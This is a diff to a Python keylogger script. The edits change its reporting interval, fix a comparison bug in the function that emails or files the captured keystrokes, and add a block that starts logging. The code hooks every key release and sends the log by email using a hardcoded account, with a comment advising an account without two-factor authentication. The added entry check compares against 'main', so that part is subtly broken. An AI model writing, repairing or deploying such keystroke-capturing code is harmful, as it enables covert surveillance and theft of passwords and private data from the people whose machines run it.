@@ -13,7 +13,7 @@ from threading import Timer
 from datetime import datetime
 
 
-send_report = 60 #this is in seconds
+send_report = 300 #this is in seconds, is 5 min
 email = 'use address without 2Factor'
 password = 'password'
 
@@ -65,7 +65,7 @@ def report(self):
     if self.log:
         self.end_dt = datetime.now()
         self.update_filename()
-        if self.report_method = 'email':
+        if self.report_method == 'email':
             self.sendmail(email, password, self.log)
         elif self.report_method == 'file':
             self.report_to_file()
@@ -80,3 +80,7 @@ def start(self):
     keyboard.on_release(callback=self.callback)
     self.report()
     keyboard.wait()
+
+if __name__ == "main":
+    keylogger = Keylogger(interval=send_report, report_method = 'file')
+    keylogger.start()
